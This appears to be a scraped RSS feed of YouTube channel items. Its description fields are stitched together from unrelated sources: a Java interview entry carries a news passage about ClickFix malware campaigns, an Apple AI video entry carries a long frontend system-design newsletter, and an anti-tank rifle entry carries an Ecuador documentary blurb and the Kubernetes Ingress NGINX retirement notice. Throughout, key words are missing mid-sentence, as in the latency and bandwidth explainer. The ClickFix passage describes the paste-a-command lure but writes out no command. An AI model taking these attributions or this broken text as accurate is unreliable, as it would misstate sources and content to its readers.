Film</title><link>https://www.youtube.com/watch?v=SfbOmLmLMpU</link><author>History Hit</author><category>yt</category><enclosure url="https://www.youtube.com/v/SfbOmLmLMpU?version=3" length="" type=""/><pubDate>Thu, 13 Nov 2025 20:00:26 +0000</pubDate><source url="https://www.youtube.com/channel/UCZwU2G-KVl-P-O-B35chZOQ">History Hit</source><content:encoded><![CDATA['Nuremberg' (2025) starring Russell Crowe, Rami Malek, Michael Shannon, Richard E.

--

Lead is a metallic element that’s distributed across Earth’s crust. When it enters the human body, it can disrupt many critical processes that span various systems, producing a diverse set of symptoms. So, just how bad is lead for human health? And if it’s really that dangerous, how did it get into so many products? Gerald Markowitz and David Rosner dig into the lethal history of lead.

ABSTRACT
The future is not what it used to be. From the end of the 19th century, through the dawn of the Atomic Age and past the rush of the Space Race, the future was painted as a place of possibility and optimism.

But now?
Not so much. Our view of the future lies somewhere between neutral and gloomy.

Why the change?
That question has come up almost every time our Program Committee has met. Back in the good old days the future was always bright. Innovation and craftsmanship was blooming. Failure not a topic.

So, if the future is not what it used to be, what is it?
In this keynote, PC members Kevlin Henney and James Lewis will look at the future seen through the eyes of the past. [...]

The number of lanes on the highway (e.g., 5 lanes). This is the maximum physical capacity of the road. The time it takes one car to drive from Exit 1 to Exit 10 at the speed limit with no traffic. The total number of cars that pass Exit 10 per hour.Now, consider a traffic jam (congestion).The  stays the same. The road still has 5 lanes.The  (travel time) rises for every car because travel takes longer.The  (cars per hour) drops because fewer cars clear the exit per hour.Networks behave the same way. Congestion increases latency and reduces throughput even when raw bandwidth does not change.Lets now explore them in more detail. It is the time it takes for a single piece of data to travel from its source to its destination. It is commonly measured in .In practice, we almost always measure , which is the time for a request to go out and an acknowledgment to come back. When you make an API call, the latency is the time between your client sending the HTTP request and receiving the first byte of the response.The speed of light sets a hard limit. Even with a 1 Gbps internet connection, your latency to a server on another continent will be high.Each router, DNS lookup, NAT, firewall, and load balancer adds queueing and processing time.Establishing a connection (especially over HTTPS) requires multiple back-and-forth steps.CPU contention, locks, context switches, garbage collection pauses, and cold code paths add processing time before a response is generated.Cache misses, missing indexes, N+1 queries, synchronous disk I/O, and cross-region reads lengthen database query time.The goal is to cut distance, round trips, and processing time. Store frequently accessed data (e.g., in Redis or a browser cache) so you avoid a slow database call or network request.Content Delivery Networks (CDNs): This is a global network of caches. When a user in India requests a video, they get it from a server in Mumbai, not New York. Run application logic (not just static content) closer to the user to reduce the number of round trips. Instead of blocking the user while your system completes a time-consuming task,  to a background process and return a response immediately.Use techniques like database indexes, partitioning, and sharding to reduce query time.Keep a long-lived connection between a client and server that remains open across multiple requests and responses. It measures how much data actually gets transferred successfully over a network in a specific amount of time.It is measured in Megabits per second (Mbps), Gigabits per second (Gbps), or often in Requests Per Second (RPS) or or Transactions Per Second (TPS). Your API server might have a low latency of 50ms. However, if that server can only process 100 requests concurrently before it runs out of CPU or database connections, its .Throughput is almost always limited by a . This bottleneck could be anything:Database connection limitsDisk read/write speeds (I/O)How to Increase ThroughputThe goal is to process more units of work in the same amount of time. You can do this by reducing the overhead of each task or by doing more tasks at once. Instead of making 1000 separate, tiny API calls to insert data, make one large API call with 1000 records. This reduces the per call overhead. This means doing multiple things at the same time. Download managers use multiple connections to download parts of a file simultaneously.Increase Server Capacity: Scale horizontally (add more servers behind a load balancer) to handle more concurrent requests.Bandwidth is the capacity. It represents the  amount of data your network link or system could handle.Bandwidth is measured as a  per second, usually in . Common units: , , . In some systems you might also see  (KB/s, MB/s), where . Your internet connection has . So a  download cannot finish faster than  in ideal conditions, no matter how low the latency is or how many threads you use.Think of bandwidth as the width of the pipe. It belongs to the link, not to a single request or user.Two important clarifications: Real applications rarely hit it because protocols, losses, CPU, and storage often limit the actual rate.Bandwidth is not throughput. Throughput is what you actually achieve at a moment in time. Bandwidth is what the link could deliver in ideal conditions.In real-world systems, we rarely talk about increasing bandwidth itself, that’s just buying a bigger pipe from your provider. Instead, we focus on using our available bandwidth more efficiently.How to Improve Bandwidth UtilizationThe goal is to get more work done with the capacity you already have. The most direct way to “improve” bandwidth is to make your data smaller. If you can make a 1 MB file 100 KB, you can send 10 times as many files over the same link in the same amount of time.For Text (HTML, CSS, JSON): Use server-side compression like  or . Serve modern formats like  or . They offer vastly better compression and quality compared to old JPEGs or PNGs. Use modern codecs (like  or ) instead of older ones (like H.264) to cut the data size in half for the same visual quality. Use modern protocols like HTTP/2 or HTTP/3 (which uses QUIC). They are far more efficient at handling multiple requests over a single connection, which reduces the “waiting” caused by latency.If you found it valuable, hit a like ❤️ and consider subscribing for more such content.If you have any questions or suggestions, leave a comment.This post is public so feel free to share it.

The company is wrapping the models in the language of anthropomorphism, claiming that they’re warmer, more conversational, and better at following instructions.The release follows complaints earlier this year that its previous models were excessively cheerful and sycophantic, along with an opposing controversy among users over how OpenAI modified the default GPT-5 output style after several suicide lawsuits.The company now faces intense scrutiny from lawyers and regulators that could threaten its future operations. In that kind of environment, it’s difficult to just release a new AI model, throw out a few stats, and move on like the company could even a year ago.

The French-US scientist has reportedly told associates he will depart in the coming months and is already in early talks to raise funds for the new venture. The departure comes as CEO Mark Zuckerberg radically overhauled Meta’s AI operations after deciding the company had fallen behind rivals such as OpenAI and Google.World models are hypothetical AI systems that some AI engineers expect to develop an internal “understanding” of the physical world by learning from video and spatial data rather than text alone. Unlike current large language models (such as the kind that power ChatGPT) that predict the next segment of data in a sequence, world models would ideally simulate cause-and-effect scenarios, understand physics, and enable machines to reason and plan more like animals do. LeCun has said this architecture could take a decade to fully develop.]]></content:encoded></item><item><title>Inside Japan’s WW2 20mm Anti-Tank Rifle - The Type 97 with Curatorial Assistant Joe Ford</title><link>https://www.youtube.com/watch?v=Z7LI4jAGKYs</link><author>Royal Armouries</author><category>yt</category><enclosure url="https://www.youtube.com/v/Z7LI4jAGKYs?version=3" length="" type=""/><pubDate>Wed, 12 Nov 2025 16:04:06 +0000</pubDate><source url="https://www.youtube.com/channel/UCsMX-XuiEkBi4-GDrYuniWg">Royal Armouries</source><content:encoded><![CDATA[This week, Joe breaks down the Japanese Type 97 anti-tank rifle: a 20×124 mm, open-bolt, semi-automatic giant introduced in 1939 and used through WWII.

With rare access to gang recruits, police, politicians and families caught in the crossfire, this documentary explores efforts to stem the violence and the human toll.

Once one of Latin America’s most peaceful nations, Ecuador has now become one of its most violent. Foreign cartels have joined with local gangs to control the drug trade, funneling cocaine to the U.S. and Europe, and pushing the homicide rate in the country to record levels. In response, Ecuador’s government declared a state of emergency in 2024, and sent the military onto the streets and into gang-plagued prisons to crack down. 

“Drug War in Ecuador” illuminates the stark human toll of it all, drawing on deep access to those involved in the struggle, from the military and police to the gangs to the families caught in the crossfire. The film focuses on the stories of three people: Father Jose Antonio Maeso, a well-known gang violence mediator  who also collects evidence of alleged abuses by the police and military; Colonel Javier Buitron, then governor in Esmeraldas, a hotbed of gang violence, who defends the government’s crackdown; and Ronny Medina, a grieving father who’s seeking justice for his 11-year-old son, Steven, one of four boys who were found dead after the military detained them. Ecuador’s military said the soldiers released the boys alive and gang members later killed them.  

Raw and profound, the documentary offers a powerful look at the ongoing crisis in the country.

“Drug War in Ecuador” is a Duskwater Films production for GBH/FRONTLINE and ITV in association with The Big Story Films. Filmed and directed by Marcel Mettelsiefen. The producers are Stephen Ellis, Marcel Mettelsiefen, Mayte Carrasco and Ahisha Ghafoor. The associate producer is Esme Ramlal. The senior producer is Eamonn Matthews.

Critics allege the military has "disappeared" innocents, including 11-year-old Steven Gerald Medina Lajones. Watch a video drawn from FRONTLINE's documentary "Drug War in Ecuador."

Steven’s death and his family’s quest for justice are among the stories that unfold in "Drug War in Ecuador," a FRONTLINE documentary premiering Nov. 11. The film explores the stark human toll of the country’s drug and gang crisis, which has caused homicide rates to skyrocket — and also examines allegations that the military has “disappeared” innocent people in the resulting crackdown.

Including Steven. 

As the above video drawn from the documentary shows, surveillance footage from December 8 in Guayaquil, Ecuador, captured the military detaining Steven and beating another boy. Steven’s charred remains and those of three 14- and 15-year-old boys he was with — Nehemías Saúl Arboleda, Josué Arroyo and Ismael Arroyo — were found on Christmas Eve. Ecuador's military said the soldiers released the boys alive and that gang members later killed them. A judge ordered 16 soldiers to be put in detention. The soldiers who picked up Steven and the other boys are currently on trial for their role in the deaths.

For the full story, watch "Drug War in Ecuador" starting Nov. 11 on @frontlinepbs.

Best-effort maintenance will continue until March 2026. Afterward, there will be no further releases, no bugfixes, and no updates to resolve any security vulnerabilities that may be discovered. Existing deployments of Ingress NGINX will continue to function and installation artifacts will remain available.We recommend migrating to one of the many alternatives. Consider migrating to Gateway API, the modern replacement for Ingress. If you must continue using Ingress, many alternative Ingress controllers are listed in the Kubernetes documentation. Continue reading for further information about the history and current state of Ingress NGINX, as well as next steps.Ingress is the original user-friendly way to direct network traffic to workloads running on Kubernetes. (Gateway API is a newer way to achieve many of the same goals.) In order for an Ingress to work in your cluster, there must be an Ingress controller running. There are many Ingress controller choices available, which serve the needs of different users and use cases. Some are cloud-provider specific, while others have more general applicability.Ingress NGINX was an Ingress controller, developed early in the history of the Kubernetes project as an example implementation of the API. It became very popular due to its tremendous flexibility, breadth of features, and independence from any particular cloud or infrastructure provider. Since those days, many other Ingress controllers have been created within the Kubernetes project by community groups, and by cloud native vendors. Ingress NGINX has continued to be one of the most popular, deployed as part of many hosted Kubernetes platforms and within innumerable independent users’ clusters.The breadth and flexibility of Ingress NGINX has caused maintenance challenges. Changing expectations about cloud native software have also added complications. What were once considered helpful options have sometimes come to be considered serious security flaws, such as the ability to add arbitrary NGINX configuration directives via the "snippets" annotations. Yesterday’s flexibility has become today’s insurmountable technical debt.Despite the project’s popularity among users, Ingress NGINX has always struggled with insufficient or barely-sufficient maintainership. For years, the project has had only one or two people doing development work, on their own time, after work hours and on weekends. Last year, the Ingress NGINX maintainers announced their plans to wind down Ingress NGINX and develop a replacement controller together with the Gateway API community. Unfortunately, even that announcement failed to generate additional interest in helping maintain Ingress NGINX or develop InGate to replace it. (InGate development never progressed far enough to create a mature replacement; it will also be retired.)Current State and Next StepsCurrently, Ingress NGINX is receiving best-effort maintenance. SIG Network and the Security Response Committee have exhausted our efforts to find additional support to make Ingress NGINX sustainable. To prioritize user safety, we must retire the project.In March 2026, Ingress NGINX maintenance will be halted, and the project will be retired. After that time, there will be no further releases, no bugfixes, and no updates to resolve any security vulnerabilities that may be discovered. The GitHub repositories will be made read-only and left available for reference.Existing deployments of Ingress NGINX will not be broken. Existing project artifacts such as Helm charts and container images will remain available.In most cases, you can check whether you use Ingress NGINX by running kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx with cluster administrator permissions.We would like to thank the Ingress NGINX maintainers for their work in creating and maintaining this project–their dedication remains impressive. This Ingress controller has powered billions of requests in datacenters and homelabs all around the world. In a lot of ways, Kubernetes wouldn’t be where it is without Ingress NGINX, and we are grateful for so many years of incredible effort.SIG Network and the Security Response Committee recommend that all Ingress NGINX users begin migration to Gateway API or another Ingress controller immediately. Many options are listed in the Kubernetes documentation: Gateway API, Ingress. Additional options may be available from vendors you work with.]]></content:encoded></item><item><title>Bringing a Neanderthal Back to Life! | Prehistoric Autopsy | BBC Earth Science</title><link>https://www.youtube.com/watch?v=qH839Ft41VQ</link><author>BBC Earth Science</author><category>yt</category><enclosure url="https://www.youtube.com/v/qH839Ft41VQ?version=3" length="" type=""/><pubDate>Tue, 11 Nov 2025 18:01:03 +0000</pubDate><source url="https://www.youtube.com/channel/UCdsOTr6SmDrxuWE7sJFrkhQ">BBC Earth Science</source><content:encoded><![CDATA[Seeing is believing!

--

If you want to learn a tree’s age, you can count their rings. When it comes to humans, scientists have yet to find any visible traits that mark our age with the same specificity. But in the past few decades, they’ve discovered small, invisible markers hidden within the body that do change over time. Juulia Jylhävä shares what these markers can tell us about our health, history, and future.

Stress is a biological superpower that helped your ancestors outrun predators, fight off enemies, and survive extreme situations. In the past, it helped us survive, but today, it’s quietly damaging millions of lives.
What exactly is stress, how did it evolve, and is it even possible to use it in a healthy way?

Their new game, Lumines Arise, exposes you to a display of perpetual creativity, where every inch of the screen is bathed in a cascade of visual effects that mesmerize you. It takes the foundation of a series that started back in 2004 and turns it on its head by giving it the Tetris Effect treatment, presenting a sensorial experience that's equally enchanting and confident.Lumines has been largely dormant for the past decade. But while Arise is a synesthesia-fueled sequel, the core conceit of this popular series is largely unchanged. You're still presented with a playfield divided into a grid, in which 2x2 blocks descend from above. Each of those blocks is composed of four squares, and each of those squares is painted with one of two colors or patterns. The goal is to drop the blocks so that squares of the same pattern touch each other, combining them into larger squares of the same type--the bigger the combined square, the more points you earn.All the while, a timeline--which is represented by a vertical line that moves from left to right with the tempo of the music--will sweep away the combined squares when it comes into contact with them. Therefore, the key is to make squares of a single type so the timeline will remove them and prevent the playfield from becoming full, which is an instant game over, while also attempting to make as many square combos as possible, either by enlarging existing ones or creating several at once. Your squares only score when the timeline sweeps through, so it's a race against the clock to make the biggest combos you can for each pass.Continue Reading at GameSpot]]></content:encoded></item><item><title>Real-World Java • Victor Grazi, Jeanne Boyarsky &amp; Barry Burd</title><link>https://www.youtube.com/watch?v=jE6kzMoknPs</link><author>GOTO Conferences</author><category>yt</category><enclosure url="https://www.youtube.com/v/jE6kzMoknPs?version=3" length="" type=""/><pubDate>Tue, 11 Nov 2025 13:29:07 +0000</pubDate><source url="https://www.youtube.com/channel/UCs_tLP3AiwYKwdUHpltJPuA">GOTO Conferences</source><content:encoded><![CDATA[This interview was recorded for the GOTO Book Club.

The increasingly common method, which many potential targets have yet to learn of, is quick, bypasses most endpoint protections, and works against both macOS and Windows users.ClickFix often starts with an email sent from a hotel that the target has a pending registration with and references the correct registration information. In other cases, ClickFix attacks begin with a WhatsApp message. In still other cases, the user receives the URL at the top of Google results for a search query. Once the mark accesses the malicious site referenced, it presents a CAPTCHA challenge or other pretext requiring user confirmation. The user receives an instruction to copy a string of text, open a terminal window, paste it in, and press Enter.Once entered, the string of text causes the PC or Mac to surreptitiously visit a scammer-controlled server and download malware. Then, the machine automatically installs it—all with no indication to the target. With that, users are infected, usually with credential-stealing malware. Security firms say ClickFix campaigns have run rampant. The lack of awareness of the technique, combined with the links also coming from known addresses or in search results, and the ability to bypass some endpoint protections are all factors driving the growth.]]></content:encoded></item><item><title>Why Apple Just Gave Up on AI</title><link>https://www.youtube.com/watch?v=Ul6_QPfoVHg</link><author>ColdFusion</author><category>yt</category><enclosure url="https://www.youtube.com/v/Ul6_QPfoVHg?version=3" length="" type=""/><pubDate>Tue, 11 Nov 2025 11:05:32 +0000</pubDate><source url="https://www.youtube.com/channel/UC4QZ_LsYcvcq7qOsOhpAX4A">ColdFusion</source><content:encoded><![CDATA[Apple has been struggling to fix Siri since it's inception in 2011, but today they find themselves even further behind.

Modern frontend engineering has grown into something much closer to backend system design.Just like your APIs need to be fast, scalable, and reliable, frontend apps also have to handle millions of users, load content quickly, and stay observable and secure.This newsletter is a quick introduction to frontend system design.We’ll take concepts you already know from the backend, like caching, deployment pipelines, observability, and security, and see how they apply in the browser.By the end, you’ll see that the frontend isn’t just about buttons and forms. It’s about building systems that run right in the user’s browser.Your AI tools are only as good as the context they have.  connects your code, docs, and conversations so Cursor, Claude, and Copilot finally understand your system like your best engineer.She’s a web developer, technical writer, and content creator with a love for frontend architecture and building things that scale.Check out her work and socials:You’ll often find her writing about web development, sharing UI tips, and building tools that make developers’ lives easier.Rendering & Delivery ModelsOne of the first things to understand is how webpages reach your users.The way you build and load them affects how fast, reliable, and smooth your site feels. You can pre-build pages, render them on the server, build them in the browser, or mix these approaches.Building web pages works much like a server handles API responses. The trade-offs change depending on when and where the HTML gets generated.Let’s start with pre-built pages and move to fully dynamic ones. We’ll see how each affects speed, scalability, and content freshness.1 Static Site Generation (SSG)Before SSG, websites worked in two fundamental ways. The server either built the page for every request, or the browser built it on the client side. That means:Every request needed work to generate the page.Pages could get slow if many people visit at once.Caching was tricky, so scaling was hard.SSG solves this by pre-building the HTML when you deploy your site. The system can fetch data during the build process, even for pages with dynamic content, which means all content is baked into static HTML files before any user visits them.During the build process, the framework executes data-fetching code, queries your database, and generates complete HTML files for each route. The framework then uploads them to your CDN or hosting provider.When users request a page, they receive a fully formed HTML document immediately, without waiting for server-side processing or client-side data fetching.This makes SSG super fast for users because there’s no rendering delay. The trade-off is that if your content changes, you’ll need to rebuild and redeploy to update the static files, which is why SSG works best for content that doesn’t change frequently.It’s like preparing API responses in advance; the hard work is done before anyone asks.Easy to handle millions of users.SEO is better because pages get fully rendered from the start.Documentation sites, marketing landing pages, or personal blogs where content updates happen through deployments, not user actions.2 Incremental Static Regeneration (ISR)Static Site Generation (SSG) is fast, but what if your content changes frequently? Rebuilding the whole site every time would be a pain.That’s where Incremental Static Regeneration (ISR) comes in.Pages are still pre-built, but they can update automatically without a full redeploy.You just set a revalidation time; after that period, the next visitor triggers a background rebuild of that specific page on the server, not a full deployment. The old version loads instantly, so users don’t wait. After regeneration, the new version replaces the cached one. This occurs per page, not site-wide, allowing you to set different revalidation intervals for individual pages.It’s like cached API responses with an expiry timer; users might glimpse an older version until it’s refreshed, but the update happens quietly behind the scenes.Just as fast as SSG, but the content stays fresh.Perfect for dynamic websites like blogs or e-commerce sites.Works with CDNs, so updates happen without downtime.E-commerce product pages where most content (e.g., descriptions or images) is static, but some parts, like prices or stock info, update occasionally.ISR keeps the page fresh without full redeploys, while real-time data, such as live prices, can come from APIs.3 Server-Side Rendering (SSR)Server-Side Rendering (SSR) works the other way around: the server builds the page for each request. It fetches the data, generates the HTML, and sends it to the user.Unlike Static Site Generation (SSG), which is great for mostly static pages, SSR is useful when content needs to stay fresh or personalised. For example, dashboards, user profiles, or live feeds. Because the system generates pages in real time, they always display the latest data instead of relying on pre-built files.Think of it like a regular API endpoint; everything gets computed on demand.Keeps content fresh and easy to personalise.Perfect for pages that need real-time data or personalised content. Under heavy traffic, SSR can slow down because it builds each page on demand, but caching can help balance load and speed.Social media feeds, admin dashboards, or user-specific pages where content varies by session.4 Client-Side Rendering (CSR)CSR means the browser does most of the work instead of the server. The server sends only a basic HTML page and some JavaScript. The browser then loads the data and builds the page on the fly.This approach is useful when you need rich interactivity, real-time updates, or pages that change often based on user actions  - things that static or server-rendered pages can’t handle easily.Think of it like sending raw JSON and letting the client put it together. The first page load can be slower because the browser needs to download and run JavaScript before showing the content. Since pages get built in the browser, search engines might not see them immediately, so you might need extra setup like pre-rendering or server-side rendering for better SEO.Reduces pressure on the server.Makes the app more interactive and responsive.Works best for apps people use for a long time, like dashboards or editors.Complex apps like Figma, Notion, or Google Docs, where the app is highly interactive and users stay on the page for extended sessions.Sometimes, one approach just isn’t enough.Different parts of your app might have different needs. For example, some pages stay mostly the same, while others need fresh or personalised data. That’s where hybrid rendering comes in.It mixes different strategies:Server-side rendering (SSR) for pages that need live or personalised content,Static site generation (SSG) for pages that rarely change,And client-side rendering (CSR) for sections with lots of interactivity.Think of it like combining pre-computed API responses with on-demand endpoints - all in the same system.You get the best of everything: speed, fresh content, and interactivity.Allows you to choose the right approach for each page or component.Reduces overloading the server while keeping content dynamic where needed.Large-scale apps like e-commerce platforms often combine different rendering strategies:The homepage and category pages use static generation for speed.Product pages use incremental static regeneration to keep content fresh.User account pages use server-side rendering for personalised data.The shopping cart uses client-side rendering for real-time updates without page reloads.6 Content Delivery Networks (CDNs) & Edge DeliveryNo matter which rendering method you choose, serving content efficiently is super important. CDNs keep copies of your static files on servers worldwide. This lets users download them from a nearby location instead of your main server.This is especially useful for global audiences. For example, when someone in India visits a site hosted in the US, the CDN delivers the content from a local server, making it load much faster.Edge rendering takes this idea a step further. Instead of just serving static files, it can actually run code or build pages at the edge, closer to the user, which reduces latency even more.Think of it like having caches and compute nodes near your users, so requests go to a nearby server instead of your main database.Faster load times everywhere.Easy to scale to millions of users.Works perfectly with SSG, ISR, SSR, or hybrid setups.Any globally distributed application. Media sites like The New York Times use CDNs to serve articles instantly worldwide.Performance & OptimisationNow that you understand how your pages get rendered, the next obvious question is, “How quickly do they actually load?”Even the most beautiful app can be frustrating if it takes too long to open or lags while being used. In frontend system design, speed really matters.7 Web Performance MetricsTo really understand your app’s speed, there are a few key metrics you should watch closely:TTFB (Time to First Byte): The time it takes for your browser to get the first piece of data back from the server or CDN after making a request.FCP (First Contentful Paint): The moment when something first appears on the screen, like text, an image, or a button, so the user knows the page is loading.LCP (Largest Contentful Paint): The time it takes for the main part of the page, like a large image or headline, to fully appear on the screen.CLS (Cumulative Layout Shift): It measures how much the page layout jumps around while loading, like when text or buttons suddenly shift because images or ads are still loading.These are basically the frontend versions of response time, throughput, and latency in backend systems. It’s important to keep a close eye on them; users can notice even minor delays of a few hundred milliseconds.You can spot slow pages before users even notice.Improves engagement and reduces bounce rates.Helps guide your optimisations for a smoother experience.E-commerce sites must optimise for LCP (product images) and CLS (avoid layout shifts during checkout). News sites focus on FCP to show headlines quickly.Of course, fast pages aren’t just about metrics; they’re also about smart resource management.Not everything on a page needs to load immediately. Lazy loading means loading heavy assets, like images, videos, or big components, only when they’re actually needed.This works by using techniques like the Intersection Observer API or conditional imports, which tell the browser to fetch those resources only when they come into view or are triggered by user interaction.It’s like fetching extra data from an API only when the user asks for it.Cuts down the initial load time.Makes the pages feel faster and smoother.Saves bandwidth for users who don’t need everything immediately.Image-heavy sites like Pinterest or Instagram use lazy loading extensively; images below the fold don’t load until you scroll.9 Service Workers & CachingOnce you’ve optimised loading, you can make your app faster and more reliable using service workers and caching.Service workers are background scripts that run in a separate thread from your main web page. They can intercept network requests and cache important files or data, helping your app load faster and even work offline.Think of them as a smart middle layer between the browser and the network; if something is already cached, it’s served instantly instead of being fetched again.Reduces the load on servers.Keeps apps usable even with poor or no internet connection.Progressive Web Apps like Twitter Lite or Starbucks PWA, which cache core UI and recent content, so users can browse even on unstable mobile networks.Once your UI loads quickly, the next step is to think about the data behind it.In real apps, this data (also called state) can come from different places: Some live inside a single component(a reusable piece of the UI, like a button),Some are shared across the app,And others come from APIs.How you manage this state can make or break your app’s speed, reliability, and scalability.10 State Management (Local, Global, Server Cache)data that lives inside a single component, used for things like toggles, forms, or small interactions. It’s simple to manage and doesn’t add much complexity. data that’s shared across multiple components or pages, like user info or theme settings. Tools like Redux, Zustand, or React Context help manage it. stores frequently used API data on the client so the app doesn’t have to fetch it again and again, making it faster and reducing server load.Think of it like database caching: by deciding where data should live, you can make your app more responsive, reliable, and easier to scale.Keeps your app responsive.Reduces unnecessary API calls.Makes scaling smoother as your app grows.Local state for a modal’s open/closed status. Global state for theme preference (dark mode) that affects every component. Server-side cache for user profile data displayed by multiple components.11 API Caching with ExpirationCaching doesn’t stop at the component level. You can store API responses in memory, IndexedDB(a browser database for larger data)or localStorage(for smaller key-value data) and set expiration rules to make sure data stays fresh.It’s like having a Redis cache server, but right in the browser instead of on your server.Keeps data up-to-date for users.Reduces repeated server requests.Makes your app feel faster.A news app might cache articles for a few minutes so users can read offline, while comments refresh more often to stay up to date. Similarly, a SaaS dashboard could cache chart data while the user is on the page, then refresh it when they come back later.12 GraphQL vs REST (Reducing Over/Under-Fetching)How you fetch data also affects performance. Can sometimes send too much data or not enough, making your app fetch extra information or require additional requests. A query language for APIs that lets the client ask for exactly the data it needs, avoiding extra or missing information. This avoids over-fetching or under-fetching data and helps reduce unnecessary requests.It’s like how you optimise database queries on the backend to make them faster and use less bandwidth, but this happens on the frontend.GraphQL sits between the client and the server as one endpoint. The client asks for exactly the data it needs, and the server’s GraphQL layer collects that data from databases or other APIs, then sends back a clean, organised response.This way, you make one flexible request instead of several REST calls, making it faster and more data-efficient.Saves bandwidth, especially on mobile networks.Reduces unnecessary requests.Simplifies client-side data handling.GraphQL works best for complex apps that need data from many places at once, like GitHub. One GraphQL query can get a pull request, comments, and author info in a single request instead of several REST calls. While REST is simpler and great for apps with stable data, like blogs or public APIs that rely on caching.13 Pagination Strategies (Cursor vs Offset)Loading large lists or tables all at once can be heavy. Pagination helps break the data into manageable chunks. Uses page numbers or record counts (like  or ) to fetch data. It’s simple and works well for lists that don’t change often. But the list order shifts if new items are added or old ones are removed. This can make the same offset return different items, leading to duplicates or missing entries. Uses a pointer to mark where the last item ended, so the next request starts right after it. It’s more reliable for live or frequently updated data (social feeds or chat messages) because it keeps track of the exact position in the dataset. That means even if new items are added or removed while you’re scrolling, you won’t see duplicates or miss entries.Handles large datasets efficiently.Prevents slowdowns and performance bottlenecks.Keeps dynamic lists reliable and consistent. best for data tables with stable data and clear page numbers, such as admin panels or product catalogs.: ideal for infinite scroll feeds like social media timelines, notification lists, or any real-time list where items are frequently added or removed.14 Real-Time Data & Networking (WebSockets, SSE, Polling)Finally, some apps need live updates, like chat apps, dashboards, or notifications. How you handle real-time data matters. Let the client and server send messages to each other in real time, both ways, without constantly asking for updates.Server-Sent Events (SSE): The server can push updates to the client in real time, but communication only goes one way, from server to client. The client regularly asks the server for updates. It’s simple to set up, but it can put more load on the server.It’s like building event-driven systems on the backend, but here it happens in the browser.Supports live dashboards, chat, and notifications.Improves interactivity and user engagement.Allows you to choose the right strategy for your app’s needs. chat apps (Slack), multiplayer games, collaborative editing (Google Docs). live notifications, stock tickers, server logs streaming to a dashboard. simple use cases like checking for new emails or status updates.Architecture & ScalabilityAs your app grows, managing complexity becomes just as important as writing features. Frontend architecture isn’t just about code; it’s about building systems that are maintainable, scalable, and predictable.When multiple teams work on the same app, things can get messy fast.Micro frontends let each team build and deploy their part of the app separately. For example, one team handles the dashboard while another builds the settings page. Technically, the app is divided into smaller frontend projects that are combined at runtime to work as one seamless app.A module federation feature (for example, in tools like Webpack) lets these separate projects share code (like components or utilities) directly in the browser, without rebuilding or duplicating code across projects.Teams can develop features faster and in parallel.Reduces duplicated code across bundles.Supports independent deployment cycles, so updates don’t block each other.16 Component-Based Architecture & Design SystemsComponents are the building blocks of your app. A design system ensures these components stay consistent and reusable across teams and projects.It’s like having reusable backend modules or libraries, but for your UI.Makes the UI predictable and easier to maintain.Encourages code reuse across pages and projects.Helps teams scale efficiently without creating chaos.Used by companies with many products or teams to keep design consistent, like Shopify’s Polaris or IBM’s Carbon, which are open-source design systems containing ready-to-use UI components, styles, and guidelines.Even small startups benefit: a shared set of 10–20 components (like buttons and modals) helps teams build faster and keep the UI consistent.17 Build & Deployment Pipelines (CI/CD for Frontend)Frontend apps also benefit from CI/CD (Continuous Integration and Continuous Deployment) pipelines, just like backend services. These pipelines automatically handle steps like building the app, running tests, and deploying updates.In simple terms, every time you push code, CI/CD tools check that nothing breaks and then safely release the latest version, making deployments faster, more reliable, and less manual.Minimises human errors during deployment.Enables fast, reliable releases.Makes scaling and frequent updates much smoother.Works for any app with regular updates, from small teams auto-deploying to Vercel to big companies like Netflix releasing thousands of times a day. It keeps updates fast, safe, and reliable.User Experience & ReliabilityYour users don’t care about your architectures or caching strategies; they just want the app to be fast, reliable, and easy to use.18 Accessibility (a11y) & Mobile-First DesignAccessibility and mobile-first design aren’t just design principles; they’re system-level considerations. Accessibility ensures your app’s UI and code structure work for everyone, including people using assistive technologies.Mobile-first design forces you to build efficient layouts, load lighter assets, and prioritize key features, all of which influence performance, scalability, and overall frontend architecture.Makes your app easier and more pleasant to use.Ensures a consistent experience across devices.Government sites (accessibility is legally required in many countries), e-commerce, and content platforms. Mobile-first is essential for apps in developing markets where mobile is the main or only device.19 Progressive Web Apps (PWAs) & Offline-FirstProgressive Web Apps (PWAs) are web apps that behave like native apps. They can work offline, send notifications, and even be installed on a device.They use a few key technologies:Service workers run in the background to cache important files like HTML, CSS, and API responses.A web app manifest defines how the app looks and behaves when installed.And HTTPS keeps everything secure.Together, these make the app fast, reliable, and installable.Users can access your app anywhere.Improves reliability and user trust.Apps where offline access is valuable: Twitter Lite, Starbucks PWA, field service apps, and news apps.20 Security Basics (XSS, CSRF, CSP, Authentication)Speed means nothing without security. Frontend isn’t just about the UI; it’s also the first line of defence for your app.XSS (Cross-Site Scripting): Stop attackers from injecting malicious scripts into your app.CSRF (Cross-Site Request Forgery): Protect your forms and actions that change data from being triggered by attackers without the user’s consent.CSP (Content Security Policy): A rule set that helps prevent malicious scripts from running in your app. Make sure user tokens and sessions are stored and handled securely in the browser.Protects your users and their data.Prevents common attacks before they reach the backend.Builds trust and helps with compliance.Any app handling sensitive data. Financial apps need strict CSP and token handling. Social platforms must prevent XSS to avoid account takeovers. E-commerce sites need CSRF protection on checkout to prevent unauthorised purchases.21 Observability & Error Monitoring (Client-Side)Even if everything works well, things can still break in production. That’s why observability is important.Frontend errors are just like 500 errors in your backend; they happen. Monitoring tools like Sentry or LogRocket help you track: errors that happen in your JavaScript code while the app is running. parts of your app that slow it down or make it lag.User interactions leading to errors: actions by users that trigger bugs or crashes in your app.These tools add a small script to your app. When something breaks, it collects information like the error message, what the user was doing, and browser details. Then it sends that data to the tool’s server, where you can see and fix the issue from your dashboard.Detects and resolves issues faster.Keeps your app stable and performant.Improves the overall user experience and trust.Used in production apps with real users. SaaS teams track errors right after deployment, e-commerce sites watch checkout issues, and session replay tools help support teams see what confused users without extra bug reports.Frontend system design is basically backend system design, just happening in the user’s browser.Every choice you make, like rendering method, caching strategy, state management, architecture, and security, affects speed, scalability, and reliability.So next time you’re building a frontend, ask yourself:Where should computation happen? On the server, in the client’s browser, or at the edge?When does the data need to be up-to-date? Prebuilt, cached, or real-time?How can we keep the app fast and reliable? Lazy loading, smart caching, or micro frontends? Can the architecture handle 10x traffic? 100x? Will new developers understand the architecture? Can teams work independently?Think of your frontend as a distributed system. Treat it that way, and your users will get an app that’s fast, smooth, and seamless, exactly what they expect.👋 I’d like to thank  for writing this newsletter!Plus, don’t forget to check out her work and socials:You’ll often find her writing about web development, sharing UI tips, and building tools that make developers’ lives easier.I’m excited to let you know we’re launching Design, Build, 